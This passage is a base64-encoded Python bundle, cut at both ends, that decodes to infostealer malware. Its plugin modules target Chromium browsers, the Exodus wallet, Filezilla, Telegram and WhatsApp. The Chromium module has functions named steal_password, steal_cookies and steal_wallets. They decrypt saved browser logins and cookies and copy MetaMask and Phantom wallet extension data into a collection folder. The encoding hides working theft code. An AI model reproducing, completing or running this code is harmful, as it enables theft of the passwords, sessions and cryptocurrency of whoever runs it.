RyKSAtPiBzdHI6XHJcbiAgICAgICAgaWYgc291cmNlX2Zvcm1hdCA9PSBzZWxmLkRFRkFVTFRfR1VOSUNPUk5fTE9HX0ZPUk1BVDpcclxuICAgICAgICAgICAgcmV0dXJuIHNlbGYuREVGQVVMVF9BSU9IVFRQX0xPR19GT1JNQVRcclxuICAgICAgICBlbGlmIHJlLnNlYXJjaChyIiVcXChbXlxcKV0rXFwpIiwgc291cmNlX2Zvcm1hdCk6XHJcbiAgICAgICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoXHJcbiAgICAgICAgICAgICAgICAiR3VuaWNvcm5cJ3Mgc3R5bGUgb3B0aW9ucyBpbiBmb3JtIG9mIGAlKG5hbWUpc2AgYXJlIG5vdCAiXHJcbiAgICAgICAgICAgICAgICAic3VwcG9ydGVkIGZvciB0aGUgbG9nIGZvcm1hdHRpbmcuIFBsZWFzZSB1c2UgYWlvaHR0cFwncyAiXHJcbiAgICAgICAgICAgICAgICAiZm9ybWF0IHNwZWNpZmljYXRpb24gdG8gY29uZmlndXJlIGFjY2VzcyBsb2cgZm9ybWF0dGluZzogIlxyXG4gICAgICAgICAgICAgICAgImh0dHA6Ly9kb2NzLmFpb2h0dHAub3JnL2VuL3N0YWJsZS9sb2dnaW5nLmh0bWwiXHJcbiAgICAgICAgICAgICAgICAiI2Zvcm1hdC1zcGVjaWZpY2F0aW9uIlxyXG4gICAgICAgICAgICApXHJcbiAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgcmV0dXJuIHNvdXJjZV9mb3JtYXRcclxuXHJcblxyXG5jbGFzcyBHdW5pY29yblVWTG9vcFdlYldvcmtlcihHdW5pY29ybldlYldvcmtlcik6XHJcbiAgICBkZWYgaW5pdF9wcm9jZXNzKHNlbGYpIC0+IE5vbmU6XHJcbiAgICAgICAgaW1wb3J0IHV2bG9vcFxyXG5cclxuICAgICAgICAjIENsb3NlIGFueSBleGlzdGluZyBldmVudCBsb29wIGJlZm9yZSBzZXR0aW5nIGFcclxuICAgICAgICAjIG5ldyBwb2xpY3kuXHJcbiAgICAgICAgYXN5bmNpby5nZXRfZXZlbnRfbG9vcCgpLmNsb3NlKClcclxuXHJcbiAgICAgICAgIyBTZXR1cCB1dmxvb3AgcG9saWN5LCBzbyB0aGF0IGV2ZXJ5XHJcbiAgICAgICAgIyBhc3luY2lvLmdldF9ldmVudF9sb29wKCkgd2lsbCBjcmVhdGUgYW4gaW5zdGFuY2VcclxuICAgICAgICAjIG9mIHV2bG9vcCBldmVudCBsb29wLlxyXG4gICAgICAgIGFzeW5jaW8uc2V0X2V2ZW50X2xvb3BfcG9saWN5KHV2bG9vcC5FdmVudExvb3BQb2xpY3koKSlcclxuXHJcbiAgICAgICAgc3VwZXIoKS5pbml0X3Byb2Nlc3MoKVxyXG5cclxuXHJcbmNsYXNzIEd1bmljb3JuVG9raW9XZWJXb3JrZXIoR3VuaWNvcm5XZWJXb3JrZXIpOlxyXG4gICAgZGVmIGluaXRfcHJvY2VzcyhzZWxmKSAtPiBOb25lOiAgIyBwcmFnbWE6IG5vIGNvdmVyXHJcbiAgICAgICAgaW1wb3J0IHRva2lvXHJcblxyXG4gICAgICAgICMgQ2xvc2UgYW55IGV4aXN0aW5nIGV2ZW50IGxvb3AgYmVmb3JlIHNldHRpbmcgYVxyXG4gICAgICAgICMgbmV3IHBvbGljeS5cclxuICAgICAgICBhc3luY2lvLmdldF9ldmVudF9sb29wKCkuY2xvc2UoKVxyXG5cclxuICAgICAgICAjIFNldHVwIHRva2lvIHBvbGljeSwgc28gdGhhdCBldmVyeVxyXG4gICAgICAgICMgYXN5bmNpby5nZXRfZXZlbnRfbG9vcCgpIHdpbGwgY3JlYXRlIGFuIGluc3RhbmNlXHJcbiAgICAgICAgIyBvZiB0b2tpbyBldmVudCBsb29wLlxyXG4gICAgICAgIGFzeW5jaW8uc2V0X2V2ZW50X2xvb3BfcG9saWN5KHRva2lvLkV2ZW50TG9vcFBvbGljeSgpKVxyXG5cclxuICAgICAgICBzdXBlcigpLmluaXRfcHJvY2VzcygpXHJcbicpCiAgICBfX3N0aWNreXRhcGVfd3JpdGVfbW9kdWxlKCdwYXRocy5weScsIGIiZnJvbSBvcyBpbXBvcnQgZW52aXJvblxyXG5mcm9tIG9zLnBhdGggaW1wb3J0IGpvaW5cclxuXHJcblxyXG5MT0NBTCA9IGVudmlyb25bJ1VTRVJQUk9GSUxFJ11cclxuVEVNUCA9IGpvaW4oTE9DQUwsICdhcHBkYXRhJywgJ2xvY2FsJywgJ3RlbXAnKSIpCiAgICBfX3N0aWNreXRhcGVfd3JpdGVfbW9kdWxlKCdwbHVnaW5zL19faW5pdF9fLnB5JywgYidmcm9tIC5iYXNlX3BsdWdpbiBpbXBvcnQgUGx1Z2luXHJcblxyXG5mcm9tIC5icm93c2VycyBpbXBvcnQgQ2hyb21pdW1cclxuXHJcbmZyb20gLmRldGFpbHMgaW1wb3J0IERldGFpbHNcclxuXHJcbmZyb20gLndhbGxldHMgaW1wb3J0IEV4b2R1c1xyXG5cclxuZnJvbSAuZmlsZXppbGxhIGltcG9ydCBGaWxlemlsbGFcclxuXHJcbmZyb20gLnRlbGVncmFtIGltcG9ydCBUZWxlZ3JhbVxyXG5cclxuZnJvbSAud2hhdHNhcHAgaW1wb3J0IFdoYXRzYXBwJykKICAgIF9fc3RpY2t5dGFwZV93cml0ZV9tb2R1bGUoJ3BsdWdpbnMvYmFzZV9wbHVnaW4ucHknLCBiJ2Zyb20gY29uZmlnIGltcG9ydCBDb25maWdcclxuZnJvbSBhYmMgaW1wb3J0IEFCQywgYWJzdHJhY3RtZXRob2RcclxuXHJcblxyXG5jbGFzcyBQbHVnaW4oQUJDKTpcclxuICAgIEBhYnN0cmFjdG1ldGhvZFxyXG4gICAgZGVmIF9faW5pdF9fKHNlbGYsIGNvbmY6IENvbmZpZykgLT4gTm9uZTpcclxuICAgICAgICAuLi5cclxuXHJcbiAgICBAYWJzdHJhY3RtZXRob2RcclxuICAgIGFzeW5jIGRlZiBjYWxsYmFjayhwYXRoOiBzdHIpIC0+IE5vbmU6XHJcbiAgICAgICAgLi4uJykKICAgIF9fc3RpY2t5dGFwZV93cml0ZV9tb2R1bGUoJ3BsdWdpbnMvYnJvd3NlcnMvX19pbml0X18ucHknLCBiJ2Zyb20gLmNocm9taXVtIGltcG9ydCBDaHJvbWl1bScpCiAgICBfX3N0aWNreXRhcGVfd3JpdGVfbW9kdWxlKCdwbHVnaW5zL2Jyb3dzZXJzL2Nocm9taXVtLnB5JywgYiJmcm9tIGFzeW5jaW8gaW1wb3J0IFRhc2ssIGNyZWF0ZV90YXNrXHJcbmZyb20gdHlwaW5nIGltcG9ydCBMaXN0XHJcbmZyb20gcGx1Z2lucyBpbXBvcnQgUGx1Z2luXHJcbmZyb20gY29uZmlnIGltcG9ydCBDb25maWdcclxuZnJvbSBvcyBpbXBvcnQgc2NhbmRpciwgbWtkaXJcclxuZnJvbSBvcy5wYXRoIGltcG9ydCBqb2luLCBpc2RpciwgaXNmaWxlLCBzcGxpdFxyXG5mcm9tIHRvb2xzIGltcG9ydCBjb3B5ZmlsZSwgY29weXRyZWUsIF9oYW5kbGVfdGFza19yZXN1bHRcclxuZnJvbSBwYXRoX3NlYXJjaCBpbXBvcnQgc2VhcmNoX3BhdGhzXHJcbmltcG9ydCBhaW9zcWxpdGVcclxuZnJvbSAuZGVjcnlwdCBpbXBvcnQgRGVjcnlwdG9yXHJcbmZyb20gdGltZSBpbXBvcnQgdGltZVxyXG5mcm9tIHBhdGhzIGltcG9ydCBURU1QXHJcbmZyb20gc2VjcmV0cyBpbXBvcnQgdG9rZW5faGV4XHJcbmZyb20gYWlvZmlsZXMgaW1wb3J0IG9wZW5cclxuXHJcblxyXG5cclxuY2xhc3MgQ2hyb21pdW0oUGx1Z2luKTpcclxuICAgIGRlZiBfX2luaXRfXyhzZWxmLCBjb25mOiBDb25maWcpIC0+IE5vbmU6XHJcbiAgICAgICAgc2VsZi5jb25mID0gY29uZlxyXG4gICAgICAgIHNlbGYuZGVjcnlwdG9yID0gTm9uZVxyXG5cclxuXHJcbiAgICBhc3luYyBkZWYgc2V0X2RlY3J5cHRvcihzZWxmLCByb290X3BhdGg6IHN0cikgLT4gTm9uZTpcclxuICAgICAgICBsb2NhbF9zdGF0ZV9mb2xkZXJzID0ge1xyXG4gICAgICAgICAgICBqb2luKHJvb3RfcGF0aCwgJ3VzZXIgZGF0YScpLFxyXG4gICAgICAgICAgICByb290X3BhdGhcclxuICAgICAgICB9XHJcblxyXG4gICAgICAgIGxvY2FsX3N0YXRlcyA9IFtdXHJcbiAgICAgICAgYXN5bmMgZm9yIGkgaW4gc2VhcmNoX3BhdGhzKGxvY2FsX3N0YXRlX2ZvbGRlcnMsIHsnTG9jYWwgU3RhdGUnfSk6XHJcbiAgICAgICAgICAgIGxvY2FsX3N0YXRlcy5hcHBlbmQoaSlcclxuXHJcbiAgICAgICAgaWYgbG9jYWxfc3RhdGVzOlxyXG4gICAgICAgICAgICBsb2NhbF9zdGF0ZV9wYXRoID0gbG9jYWxfc3RhdGVzWzBdXHJcbiAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgbG9jYWxfc3RhdGVfcGF0aCA9IE5vbmVcclxuXHJcbiAgICAgICAgc2VsZi5kZWNyeXB0b3IgPSBEZWNyeXB0b3IobG9jYWxfc3RhdGVfcGF0aClcclxuXHJcblxyXG4gICAgYXN5bmMgZGVmIHN0ZWFsX3Bhc3N3b3JkKHNlbGYsIHJvb3RfcGF0aDogc3RyKSAtPiBOb25lOlxyXG4gICAgICAgIHRyeTpcclxuICAgICAgICAgICAgcm93cyA9IFtdXHJcblxyXG4gICAgICAgICAgICBpZiBub3QgaXNkaXIocm9vdF9wYXRoKTpcclxuICAgICAgICAgICAgICAgIHJldHVybiBbXVxyXG5cclxuICAgICAgICAgICAgbG9naW5fZGF0YV9mb2xkZXJfcGF0aHMgPSB7XHJcbiAgICAgICAgICAgICAgICBqb2luKHJvb3RfcGF0aCwgJ3VzZXIgZGF0YScsICdkZWZhdWx0JyksXHJcbiAgICAgICAgICAgICAgICByb290X3BhdGhcclxuICAgICAgICAgICAgfVxyXG5cclxuICAgICAgICAgICAgYXN5bmMgZm9yIHAgaW4gc2VhcmNoX3BhdGhzKGxvZ2luX2RhdGFfZm9sZGVyX3BhdGhzLCB7J0xvZ2luIERhdGEnfSk6XHJcbiAgICAgICAgICAgICAgICB0cnk6XHJcbiAgICAgICAgICAgICAgICAgICAgaWYgbm90IGlzZmlsZShwKTpcclxuICAgICAgICAgICAgICAgICAgICAgICAgY29udGludWVcclxuICAgICAgICAgICAgICAgICAgICBcclxuICAgICAgICAgICAgICAgICAgICB0ZW1wX3BhdGggPSBqb2luKFRFTVAsIGYnTG9naW4gRGF0YSB7dGltZSgpfScpXHJcbiAgICAgICAgICAgICAgICAgICAgYXdhaXQgY29weWZpbGUocCwgdGVtcF9wYXRoKVxyXG5cclxuICAgICAgICAgICAgICAgICAgICBpZiBub3Qgc2VsZi5kZWNyeXB0b3I6XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGF3YWl0IHNlbGYuc2V0X2RlY3J5cHRvcihyb290X3BhdGgpXHJcbiAgICAgICAgICAgICAgICAgICAgYXN5bmMgd2l0aCBhaW9zcWxpdGUuY29ubmVjdCh0ZW1wX3BhdGgpIGFzIGNvbm46XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIHNxbCA9ICdzZWxlY3QgKiBmcm9tIGxvZ2lucydcclxuICAgICAgICAgICAgICAgICAgICAgICAgYXN5bmMgd2l0aCBjb25uLmV4ZWN1dGUoc3FsKSBhcyBjdXJyOlxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgYXN5bmMgZm9yIHJvdyBpbiBjdXJyOlxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRyeTpcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcm93cy5hcHBlbmQoKHJvd1sxXSwgcm93WzNdLCBzZWxmLmRlY3J5cHRvci5kZWNyeXB0X3Bhc3N3b3JkKHJvd1s1XSkpKVxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZTpcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYXdhaXQgc2VsZi5jb25mLmxvZ2dlci5sb2coZidceGQwXHg5ZVx4ZDFceDg4XHhkMFx4YjhceGQwXHhiMVx4ZDBceGJhXHhkMFx4YjAgXHhkMFx4YmZceGQxXHg4MFx4ZDBceGI4IFx4ZDBceGI0XHhkMFx4YjVceGQwXHhiYVx4ZDFceDgwXHhkMFx4YjhceGQwXHhiZlx4ZDFceDgyXHhkMFx4YjUgXHhkMFx4YmZceGQwXHhiMFx4ZDFceDgwXHhkMFx4YmVceGQwXHhiYlx4ZDFceDhmLCB7ZX0nKVxyXG4gICAgICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOlxyXG4gICAgICAgICAgICAgICAgICAgIGF3YWl0IHNlbGYuY29uZi5sb2dnZXIubG9nKGYnXHhkMFx4OWVceGQxXHg4OFx4ZDBceGI4XHhkMFx4YjFceGQwXHhiYVx4ZDBceGIwIFx4ZDBceGJmXHhkMVx4ODBceGQwXHhiOCBceGQwXHhiZlx4ZDBceGJlXHhkMFx4YmZceGQxXHg4Ylx4ZDFceDgyXHhkMFx4YmFceGQwXHhiNSBceGQxXHg4MVx4ZDBceGJmXHhkMFx4YjhceGQwXHhiN1x4ZDBceGI0XHhkMFx4YjhceGQxXHg4Mlx4ZDFceDhjIFx4ZDBceGJmXHhkMFx4YjBceGQxXHg4MFx4ZDBceGJlXHhkMFx4YmJceGQwXHhiOCBceGQxXHg4MSB7cH0sIFx4ZDBceGJlXHhkMVx4ODhceGQwXHhiOFx4ZDBceGIxXHhkMFx4YmFceGQwXHhiMCB7ZX0nKVxyXG5cclxuICAgICAgICAgICAgaWYgcm93czpcclxuICAgICAgICAgICAgICAgIG5hbWUgPSBmJ3tzcGxpdChyb290X3BhdGgpWzFdfV97dG9rZW5faGV4KDUpfS50eHQnXHJcbiAgICAgICAgICAgICAgICBwYXNzd29yZHNfcGF0aCA9IGpvaW4oc2VsZi5jb25mLmxvZ19wYXRoLCAncGFzc3dvcmRzJylcclxuICAgICAgICAgICAgICAgIHBhdGggPSBqb2luKHBhc3N3b3Jkc19wYXRoLCBuYW1lKVxyXG5cclxuICAgICAgICAgICAgICAgIGlmIG5vdCBpc2RpcihwYXNzd29yZHNfcGF0aCk6XHJcbiAgICAgICAgICAgICAgICAgICAgbWtkaXIocGFzc3dvcmRzX3BhdGgpXHJcblxyXG4gICAgICAgICAgICAgICAgYXN5bmMgd2l0aCBvcGVuKHBhdGgsICd3JywgZW5jb2Rpbmc9J3V0ZjgnKSBhcyBmOlxyXG4gICAgICAgICAgICAgICAgICAgIGZvciB1cmwsIGxvZ2luLCBwYXNzd29yZCBpbiByb3dzOlxyXG4gICAgICAgICAgICAgICAgICAgICAgICBhd2FpdCBmLndyaXRlKGYnVVJMOiB7dXJsfVxcbkxvZ2luOiB7bG9naW59XFxuUGFzc3dvcmQ6IHtwYXNzd29yZH1cXG5cXG4nKVxyXG5cclxuICAgICAgICAgICAgICAgIGF3YWl0IHNlbGYuY29uZi5sb2dnZXIubG9nKGYnXHhkMFx4YTFceGQwXHhiZlx4ZDBceGI4XHhkMFx4YjdceGQwXHhiNlx4ZDBceGI1XHhkMFx4YmRceGQxXHg4YiBceGQwXHhiZlx4ZDBceGIwXHhkMVx4ODBceGQwXHhiZVx4ZDBceGJiXHhkMFx4YjggXHhkMVx4ODEge3Jvb3RfcGF0aH0nKVxyXG4gICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZTpcclxuICAgICAgICAgICAgYXdhaXQgc2VsZi5jb25mLmxvZ2dlci5sb2coZidFcnJvciBpbiBzdGVhbF9wYXNzd29yZDoge2V9JylcclxuXHJcbiAgICBhc3luYyBkZWYgc3RlYWxfY29va2llcyhzZWxmLCByb290X3BhdGg6IHN0cikgLT4gTm9uZTpcclxuICAgICAgICB0cnk6XHJcbiAgICAgICAgICAgIGlmIG5vdCBpc2Rpcihyb290X3BhdGgpOlxyXG4gICAgICAgICAgICAgICAgcmV0dXJuIFtdXHJcblxyXG4gICAgICAgICAgICBjb29raWVzID0gJydcclxuXHJcbiAgICAgICAgICAgIGNvb2tpZV9mb2xkZXJfcGF0aHMgPSB7XHJcbiAgICAgICAgICAgICAgICBqb2luKHJvb3RfcGF0aCwgJ3VzZXIgZGF0YScsICdkZWZhdWx0JywgJ25ldHdvcmsnKSwgXHJcbiAgICAgICAgICAgICAgICBqb2luKHJvb3RfcGF0aCwgJ3VzZXIgZGF0YScsICdkZWZhdWx0JyksXHJcbiAgICAgICAgICAgICAgICByb290X3BhdGhcclxuICAgICAgICAgICAgfVxyXG5cclxuICAgICAgICAgICAgYXN5bmMgZm9yIHAgaW4gc2VhcmNoX3BhdGhzKGNvb2tpZV9mb2xkZXJfcGF0aHMsIHsnQ29va2llcycsICdjb29raWVzLnNxbGl0ZSd9KTpcclxuICAgICAgICAgICAgICAgIGlmIG5vdCBpc2ZpbGUocCk6XHJcbiAgICAgICAgICAgICAgICAgICAgY29udGludWVcclxuXHJcbiAgICAgICAgICAgICAgICB0ZW1wX3BhdGggPSBqb2luKFRFTVAsIGYnQ29va2llcyB7dGltZSgpfScpXHJcbiAgICAgICAgICAgICAgICBhd2FpdCBjb3B5ZmlsZShwLCB0ZW1wX3BhdGgpXHJcblxyXG4gICAgICAgICAgICAgICAgaWYgbm90IHNlbGYuZGVjcnlwdG9yOlxyXG4gICAgICAgICAgICAgICAgICAgIGF3YWl0IHNlbGYuc2V0X2RlY3J5cHRvcihyb290X3BhdGgpXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFxyXG4gICAgICAgICAgICAgICAgYXN5bmMgd2l0aCBhaW9zcWxpdGUuY29ubmVjdCh0ZW1wX3BhdGgpIGFzIGNvbm46XHJcbiAgICAgICAgICAgICAgICAgICAgc3FsID0gJ3NlbGVjdCAqIGZyb20gY29va2llcydcclxuICAgICAgICAgICAgICAgICAgICBhc3luYyB3aXRoIGNvbm4uZXhlY3V0ZShzcWwpIGFzIGN1cnI6XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGFzeW5jIGZvciByb3cgaW4gY3VycjpcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbnYgPSBsYW1iZGEgeDogJ1RSVUUnIGlmIHggZWxzZSAnRkFMU0UnXHJcblxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgdHJ5OlxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGhvc3QgPSByb3dbMV1cclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBodHRwX29ubHkgPSBjb252KHJvd1s5XSlcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwYXRoID0gcm93WzZdXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VjdXJlID0gY29udihyb3dbOF0pXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZXhwaXJhdGlvbl9kYXRlID0gc3RyKHJvd1s3XSlcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBuYW1lID0gcm93WzNdXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdmFsdWUgPSBzZWxmLmRlY3J5cHRvci5kZWNyeXB0X3Bhc3N3b3JkKHJvd1s1XSlcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZTpcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBhd2FpdCBzZWxmLmNvbmYubG9nZ2VyLmxvZyhmJ1x4ZDBceDllXHhkMVx4ODhceGQwXHhiOFx4ZDBceGIxXHhkMFx4YmFceGQwXHhiMCBceGQwXHhiZlx4ZDFceDgwXHhkMFx4YjggXHhkMFx4YjRceGQwXHhiNVx4ZDBceGJhXHhkMVx4ODBceGQwXHhiOFx4ZDBceGJmXHhkMVx4ODJceGQwXHhiNSBceGQwXHhiYVx4ZDFceDgzXHhkMFx4YmFceGQwXHhiMCwge2V9JylcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgbm90IHZhbHVlOlxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHZhbHVlID0gJydcclxuXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb29raWUgPSAnXFx0Jy5qb2luKFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIChob3N0LCBodHRwX29ubHksIHBhdGgsIHNlY3VyZSwgZXhwaXJhdGlvbl9kYXRlLCBuYW1lLCB2YWx1ZSkpXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb29raWVzICs9IGNvb2tpZSArICdcXG4nXHJcblxyXG4gICAgICAgICAgICBpZiBjb29raWVzOlxyXG4gICAgICAgICAgICAgICAgbmFtZSA9IGYne3NwbGl0KHJvb3RfcGF0aClbMV19X3t0b2tlbl9oZXgoNSl9LnR4dCdcclxuICAgICAgICAgICAgICAgIGNvb2tpZXNfcGF0aCA9IGpvaW4oc2VsZi5jb25mLmxvZ19wYXRoLCAnY29va2llcycpXHJcbiAgICAgICAgICAgICAgICBwYXRoID0gam9pbihjb29raWVzX3BhdGgsIG5hbWUpXHJcbiAgICAgICAgICAgICAgICBcclxuICAgICAgICAgICAgICAgIGlmIG5vdCBpc2Rpcihjb29raWVzX3BhdGgpOlxyXG4gICAgICAgICAgICAgICAgICAgIG1rZGlyKGNvb2tpZXNfcGF0aClcclxuXHJcbiAgICAgICAgICAgICAgICBhc3luYyB3aXRoIG9wZW4ocGF0aCwgJ3cnLCBlbmNvZGluZz0ndXRmOCcpIGFzIGY6XHJcbiAgICAgICAgICAgICAgICAgICAgYXdhaXQgZi53cml0ZShjb29raWVzKVxyXG4gICAgICAgICAgICBcclxuICAgICAgICAgICAgICAgIGF3YWl0IHNlbGYuY29uZi5sb2dnZXIubG9nKGYnXHhkMFx4YTFceGQwXHhiZlx4ZDBceGI4XHhkMFx4YjdceGQwXHhiNlx4ZDBceGI1XHhkMFx4YmRceGQxXHg4YiBceGQwXHhiYVx4ZDFceDgzXHhkMFx4YmFceGQwXHhiOCBceGQxXHg4MSB7cm9vdF9wYXRofScpXHJcbiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOlxyXG4gICAgICAgICAgICBhd2FpdCBzZWxmLmNvbmYubG9nZ2VyLmxvZyhmJ0Vycm9yIGluIHN0ZWFsX2Nvb2tpZXM6IHtlfScpXHJcblxyXG5cclxuICAgIGFzeW5jIGRlZiBzdGVhbF93YWxsZXRzKHNlbGYsIHJvb3RfcGF0aDogc3RyKSAtPiBOb25lOlxyXG4gICAgICAgIHRyeTpcclxuICAgICAgICAgICAgaWYgbm90IGlzZGlyKHJvb3RfcGF0aCk6XHJcbiAgICAgICAgICAgICAgICByZXR1cm4gW11cclxuXHJcbiAgICAgICAgICAgIHdhbGxldF9mb2xkZXJfcGF0aHMgPSB7XHJcbiAgICAgICAgICAgICAgICBqb2luKHJvb3RfcGF0aCwgJ3VzZXIgZGF0YScsICdkZWZhdWx0JywgJ2xvY2FsIGV4dGVuc2lvbiBzZXR0aW5ncycpLCBcclxuICAgICAgICAgICAgICAgIGpvaW4ocm9vdF9wYXRoLCAndXNlciBkYXRhJywgJ2xvY2FsIGV4dGVuc2lvbiBzZXR0aW5ncycpLCBcclxuICAgICAgICAgICAgICAgIGpvaW4ocm9vdF9wYXRoLCAnbG9jYWwgZXh0ZW5zaW9uIHNldHRpbmdzJylcclxuICAgICAgICAgICAgfVxyXG5cclxuICAgICAgICAgICAgd2FsbGV0cyA9IHtcclxuICAgICAgICAgICAgICAgICdua2JpaGZiZW9nYWVhb2VobGVmbmtvZGJlZmdwZ2tubic6ICdtZXRhbWFzaycsXHJcbiAgICAgICAgICAgICAgICAnYmZuYWVsbW9tZWltaGxwbWdqbmpvcGhocGtrb2xqcGEnOiAncGhhbnRvbSdcclxuICAgICAgICAgICAgfVxyXG5cclxuICAgICAgICAgICAgYXN5bmMgZm9yIHAgaW4gc2VhcmNoX3BhdGhzKHdhbGxldF9mb2xkZXJfcGF0aHMsIHNldCh3YWxsZXRzLmtleXMoKSkpOlxyXG4gICAgICAgICAgICAgICAgaWYgbm90IGlzZGlyKHApOlxyXG4gICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlXHJcbiAgICAgICAgICAgICAgICBcclxuICAgICAgICAgICAgICAgIHdhbGxldHNfcGF0aCA9IGpvaW4oc2VsZi5jb25mLmxvZ19wYXRoLCAnd2FsbGV0cycpXHJcbiAgICAgICAgICAgICAgICBpZiBub3QgaXNkaXIod2FsbGV0c19wYXRoKTpcclxuICAgICAgICAgICAgICAgICAgICBta2Rpcih3YWxsZXRzX3BhdGgpXHJcblxyXG4gICAgICAgICAgICAgICAgbmFtZSA9IHNwbGl0KHApWzFdXHJcbiAgICAgICAgICAgICAgICB3YWxsZXRfbmFtZSA9IHdhbGxldHNbbmFtZV1cclxuICAgICAgICAgICAgICAgIGRlc3RfcGF0aCA9IGpvaW4od2FsbGV0c19wYXRoLCBmJ3t3YWxsZXRfbmFtZX1fe3Rva2VuX2hleCg0KX0nKVxyXG5cclxuICAgICAgICAgICAgICAgIHRyeTpcclxuICAgICAgICAgICAgICAgICAgICBhd2FpdCBjb3B5dHJlZShwLCBkZXN0X3BhdGgpXHJcbiAgICAgICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6XHJcbiAgICAgICAgICAgICAgICAgICAgcGFzc1xyXG5cclxuICAgICAgICAgICAgICAgIGF3YWl0IHNlbGYuY29uZi5sb2dnZXIubG9nKGYnXHhkMFx4YTFceGQwXHhiZlx4ZDBceGI4XHhkMFx4YjdceGQwXHhiNlx4ZDBceGI1XHhkMFx4YmQgXHhkMFx4YjJceGQwXHhiNVx4ZDBceGIxIFx4ZDBceGJhXHhkMFx4YmVceGQxXHg4OFx4ZDBceGI1XHhkMFx4YmJceGQxXHg4YyBceGQxXHg4MSB7cH0nKVxyXG4gICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZTpcclxuICAgICAgICAgICAgYXdhaXQgc2VsZi5jb25mLmxvZ2dlci5sb2coZidceGQwXHg5ZVx4ZDFceDg4XHhkMFx4YjhceGQwXHhiMVx4ZDBceGJhXHhkMFx4YjAgXHhkMFx4YmZceGQxXHg4MFx4ZDBceGI4IFx4ZDBceGJmXHhkMFx4YmVceGQwXHhiZlx4ZDFceDhiXHhkMVx4ODJceGQwXHhiYVx4ZDBceGI1IFx4ZDFceDgxXHhkMFx4YmZceGQwXHhiOFx4ZDBceGI3XHhkMFx4YjRceGQwXHhiOFx4ZDFceDgyXHhkMVx4OGMgXHhkMFx4YjJceGQwXHhiNVx4ZDBceGIxIFx4ZDBceGJhXHhkMFx4YmVceGQxXHg4OFx4ZDBceGI1XHhkMFx4YmJceGQwXHhiNVx4ZDBceGJhIHtyb290X3BhdGh9JylcclxuICAgIFxyXG5cclxuICAgIGFzeW5jIGRlZiBjYWxsYmFjayhzZWxmLCBwYXRoOiBzdHIpIC0+IE5vbmU6XHJcbiAgICAgICAgY2hyb21pdW1fYnJvd3Nlcl9uYW1lcyA9IHtcclxuICAgICAgICAgICAgJ29wZXJhIGd4IHN0YWJsZScsXHJcbiAgICAgICAgICAgICdvcGVyYSBzdGFibGUnLFxyXG4gICAgICAgICAgICAnY2hyb21lJyxcclxuICAgICAgICAgICAgJ3lhbmRleGJyb3dzZXInXHJcbiAgICAgICAgfVxyXG5cclxuICAgICAgICB0YXNrczogTGlzdFtUYXNrXSA9IFtdXHJcblxyXG4gICAgICAgIGZvciBmb2xkZXJfbmFtZSBpbiBjaHJvbWl1bV9icm93c2VyX25hbWVzLmludGVyc2VjdGlvbihpLm5hbWUubG93ZXIoKSBmb3IgaSBpbiBzY2FuZGlyKHBhdGgpKTpcclxuICAgICAgICAgICAgcm9vdF9wYXRoID0gam9pbihwYXRoLCBmb2xkZXJfbmFtZSlcclxuICAgICAgICAgICAgdGFza3MuYXBwZW5kKGNyZWF0ZV90YXNrKHNlbGYuc3RlYWxfcGFzc3dvcmQocm9vdF9wYXRoKSkpXHJcbiAgICAgICAgICAgIHRhc2tzLmFwcGVuZChjcmVhdGVfdGFzayhzZWxmLnN0ZWFsX2Nvb2tpZXMocm9vdF9wYXRoKSkpXHJcbiAgICAgICAgICAgIHRhc2tzLmFwcGVuZChjcmVhdGVfdGFzayhzZWxmLnN0ZWFsX3dhbGxldHMocm9vdF9wYXRoKSkpXHJcblxyXG4gICAgICAgIGZvciB0YXNrIGluIHRhc2tzOlxyXG4gICAgICAgICAgICB0YXNrLmFkZF9kb25lX2NhbGxiYWNrKGxhbWJkYSB4OiBfaGFuZGxlX3Rhc2tfcmVzdWx0KHgsIHNlbGYuY29uZi5sb2dnZXIpKVxyXG4gICAgICAgICAgICBcclxuICAgICAgICBmb3IgdGFzayBpbiB0YXNrczpcclxuICAgICAgICAgICAgdHJ5OlxyXG4gICAgICAgICAgICAgICAgYXdhaXQgdGFza1xyXG4gICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6XHJcbiAgICAgICAgICAgICAgICBhd2FpdCBzZWxmLmNvbmYubG9nZ2VyLmxvZyhmJ0Vycm9yIGluIGNocm9taXVtIHRhc2